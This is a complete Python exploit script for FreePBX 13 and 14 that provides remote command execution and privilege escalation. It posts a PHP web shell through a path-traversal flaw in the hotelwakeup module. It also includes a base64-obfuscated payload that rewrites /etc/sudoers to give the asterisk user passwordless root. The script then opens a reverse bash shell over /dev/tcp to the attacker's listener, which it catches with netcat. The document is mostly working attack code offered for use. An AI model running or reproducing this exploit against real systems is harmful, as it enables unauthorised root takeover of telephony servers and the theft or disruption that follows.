&#039;&#039;&#039;
    Title          |  FreePBX 13 Remote Command Execution and Privilege Escalation
    Date           |  10/21/2016
    Author         |  Christopher Davis 
    Vendor         |  https://www.freepbx.org/
    Version        |  FreePBX 13 & 14 (System Recordings Module versions: 13.0.1beta1 - 13.0.26)
    Tested on      |  http://downloads.freepbxdistro.org/ISO/FreePBX-64bit-10.13.66.iso 
                      http://downloads.freepbxdistro.org/ISO/FreePBX-32bit-10.13.66.iso
    Purpose        |  This script exploits the freepbx website, elevates privileges and returns a reverse bind tcp as root
    Usage          |  python pbx.py -u http://10.2.2.109 -l 10.2.2.115 -p 4444 -s r
    Orig Author    |  pgt - nullsecurity.net 
&#039;&#039;&#039;
import re
import subprocess
import argparse
import random
import time
import socket
import threading
 
#This portion will check for requests and prompt user to install it if not already
try:
    import requests
except:
    try:
        while True:
            choice = raw_input(&#039;Requests library not found but is needed. Install? \&#039;Y\&#039;es or \&#039;N\&#039;o?\n:&#039;)
            if choice.lower() == &#039;y&#039;:
                subprocess.call(&#039;pip install requests&#039;,shell=True)
                import requests
                break
            elif choice.lower() == &#039;n&#039;:
                exit()
            else:
                continue
    except Exception as e:
        print(e)
        exit()
 
#Since subprocess.call will bind, we start this thread sepparate to execute after our netcat bind
def delayGet():
    global args
    try:
        time.sleep(5)
        requests.get(args.url+ &#039;0x4148.php.call&#039;, verify=False)
    except:
        pass
 
if __name__ == &#039;__main__&#039;:
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument(&#039;-u&#039;, type=str, help=&#039;hostname and path. Ex- http://192.168.1.1/path/&#039;, dest=&#039;url&#039;)
        parser.add_argument(&#039;-l&#039;, type=str, help=&#039;localhost ip to listen on&#039;, dest=&#039;lhost&#039;)
        parser.add_argument(&#039;-p&#039;, type=str, help=&#039;port to listen on&#039;, dest=&#039;lport&#039;)
        parser.add_argument(&#039;-s&#039;, type=str, help="&#039;L&#039;ocal or &#039;R&#039;oot shell attempt", dest=&#039;shell&#039;)
        parser.add_help
        args = parser.parse_args()
 
        #Make sure args were passed
        if args.url == None or args.lhost == None or args.lport == None or not bool(re.search(r&#039;^(?:[L|l]|[r|R])$&#039;, args.shell)):
            parser.print_help()
            print("\nUsage:  python freepbx.py -u http://10.2.2.109 -l 10.2.2.115 -p 4444")
            exit()
 
        #Make sure the http url is there
        if bool(re.search(&#039;[hH][tT][tT][pP][sS]?\:\/\/&#039;, args.url)) == False:
            print(&#039;There is something wrong with your url. It needs to have http:// or https://\n\n&#039;)
            exit()
 
        #make sure / is there, if not, put it there
        if args.url[-1:] != &#039;/&#039;:
            args.url += &#039;/&#039;
        #python -c &#039;import pty; pty.spawn("/bin/sh")&#039;
        #this is the php we will upload to get a reverse shell. System call to perform reverse bash shell. Nohup spawns a new process in case php dies
 
        #if version 13, lets try to get root, otherwise
        if args.shell.upper() == &#039;R&#039;:
            cmdshell = &#039;<?php fwrite(fopen("hackerWAShere.py","w+"),base64_decode("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHRpbWUNCiMgLSotIGNvZGluZzogdXRmLTggLSotIA0KY21kID0gJ3NlZCAtaSBcJ3MvQ29tIEluYy4vQ29tIEluYy5cXG5lY2hvICJhc3RlcmlzayBBTEw9XChBTExcKVwgICcgXA0KCSdOT1BBU1NXRFw6QUxMIlw+XD5cL2V0Y1wvc3Vkb2Vycy9nXCcgL3Zhci9saWIvJyBcDQoJJ2FzdGVyaXNrL2Jpbi9mcmVlcGJ4X2VuZ2luZScNCnN1YnByb2Nlc3MuY2FsbChjbWQsIHNoZWxsPVRydWUpDQpzdWJwcm9jZXNzLmNhbGwoJ2VjaG8gYSA+IC92YXIvc3Bvb2wvYXN0ZXJpc2svc3lzYWRtaW4vYW1wb3J0YWxfcmVzdGFydCcsIHNoZWxsPVRydWUpDQp0aW1lLnNsZWVwKDIwKQ==")); system("python hackerWAShere.py; nohup sudo bash -i >& /dev/tcp/&#039;+args.lhost+&#039;/&#039;+args.lport+&#039; 0>&1 ");?>&#039;
        else:
            cmdshell = "<?php system(&#039;nohup bash -i >& /dev/tcp/"+args.lhost+"/"+args.lport+" 0>&1 &#039;);?>"
         
        #creates a session
        session = requests.Session()
        print(&#039;\nStarting Session&#039;)
        session.get(args.url, verify=False)
        print(&#039;\nScraping the site for a cookie&#039;)
        HEADERS = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0", "Accept": &#039;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#039;, "Accept-Language":"en-US,en;q=0.5","Referer": args.url + &#039;admin/ajax.php&#039;, &#039;Connection&#039;: &#039;keep-alive&#039;, &#039;Upgrade-Insecure-Requests&#039;: &#039;1&#039;}
        print(&#039;\nPosting evil php&#039;)
        postData = {&#039;module&#039;:&#039;hotelwakeup&#039;,&#039;command&#039;:&#039;savecall&#039;,&#039;day&#039;:&#039;now&#039;,&#039;time&#039;:&#039;+1 week&#039;,&#039;destination&#039;:"/../../../../../../var/www/html/0x4148.php","language":cmdshell}
        result = session.post(args.url + &#039;admin/ajax.php&#039;, headers=HEADERS, data=postData, verify=False)
        if &#039;Whoops&#039; not in result.text:
            print(result.text)
            print(&#039;\nSomething Went wrong. Was expecting a Whoops but none found.&#039;)
            exit()
        #calls the get thread which will execute 5 seconds after the netcat bind
 
        print(&#039;\nStarting new thread for getting evil php&#039;)
        z = threading.Thread(target=delayGet)
        z.daemon = True
        z.start()
 
        print(&#039;\nBinding to socket &#039;+ args.lport + &#039; Please wait... May take 30 secs to get call back.\n&#039;)
        #This binds our terminal with netcat and waits for the call back
        try:
            subprocess.call(&#039;nc -nvlp &#039;+args.lport, shell=True)
        except Exception as e:
            print(e)
    except Exception as e:
        print(e)
        print(&#039;\nSee above error&#039;)

